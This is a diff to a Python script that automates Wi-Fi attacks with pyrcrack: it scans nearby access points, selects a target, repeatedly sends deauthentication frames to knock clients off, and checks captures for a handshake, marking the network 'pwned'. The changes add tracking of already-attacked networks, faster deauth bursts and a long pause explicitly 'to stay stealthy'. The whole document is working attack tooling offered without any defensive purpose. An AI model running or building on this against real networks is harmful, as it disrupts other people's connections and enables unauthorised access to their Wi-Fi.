@@ -3,10 +3,13 @@
 import asyncio
 import pyrcrack
 import subprocess
+from sys import argv
+from tinydb import TinyDB, Query
 from os import listdir
 
+pdb = TinyDB('aps.json')
 ldb = {}
-IFACE="wlan2"
+IFACE="wlan2" if len(argv) < 2 else argv[1]
 CHECKED=0
 
 async def check_pcap(cap_file, bssid):
@@ -26,7 +29,7 @@ async def deauth_client(AP, pdump, c_bssid):
         async with pyrcrack.AireplayNg() as aireplay:
             async for res in aireplay(IFACE, deauth=10, D=True, a=AP['bssid'], c=c_bssid):
                 print('Res in aireplay', res)
-                await asyncio.sleep(3)
+                await asyncio.sleep(1)
                 continue
 
 async def deauth_clients(AP, pdump):
@@ -52,6 +55,7 @@ def get_best_ap(ldb):
 async def scan_single(AP, max_tries=3):
     tries = 0
     waited = 0
+    noclients = 0
     print('Scanning single AP', AP)
     async with pyrcrack.AirodumpNg() as pdump:
         async for result in pdump(IFACE, channel=AP['channel'], bssid=AP['bssid']):
@@ -59,6 +63,15 @@ async def scan_single(AP, max_tries=3):
                 print('AP', ap)
                 print('AP dict', ap.asdict())
 
+                if noclients >= 10: #If no client shows up, we abandon after 10 tries (10*5 seconds)
+                    return False
+                
+                if len(ap.clients) == 0 or ap.clients[0].data.toDict() == {}:
+                    print('No valid clients detected, waiting 5... - ', noclients)
+                    noclients += 1
+                    await asyncio.sleep(5)
+                    continue
+                
                 for client in ap.clients:
                     print('Client data :')
                     print(client.data.toDict())
@@ -77,8 +90,7 @@ async def scan_single(AP, max_tries=3):
                             print('Incrementing waited', waited)
                             waited += 1
                             await asyncio.sleep(1)
-                    else:
-                        print('No clients')
+
                 pwned = await check_pcap(pdump.get_file('cap'), AP['bssid'])
                 if pwned:
                     return True
@@ -100,14 +112,17 @@ async def scan(wait=10):
             best_ap = get_best_ap(ldb)
             print('Best AP so far', best_ap)
             if best_ap and int(best_ap['score']) > 50 and waited >= wait:
-                print('Got a good candidate')
-                print(AP.asdict())
-                selected_ap = AP.asdict()
-                break
+                AccessPoint = Query()
+                existing = pdb.search(AccessPoint.bssid == best_ap['bssid'])
+                if not existing:
+                    print('Got a good candidate')
+                    print(best_ap)
+                    selected_ap = best_ap
+                    break
+                else:
+                    ldb[best_ap['bssid']] = existing
             else:
                 print(ldb)
-                print(AP.essid)
-                print(AP.bssid)
             await asyncio.sleep(2)
             waited += 1
             print('WAITED', waited)
@@ -115,7 +130,10 @@ async def scan(wait=10):
         pwned = await scan_single(selected_ap)
         print('pwned is', pwned)
         ldb[AP.bssid]['pwned'] = pwned
+        pdb.insert(ldb[AP.bssid])
         print('LDB dump', ldb)
+        print('Sleeping to stay stealthy')
+        await asyncio.sleep(360) # we sleep in order not to make too much noise
 
 def main():
     while True:
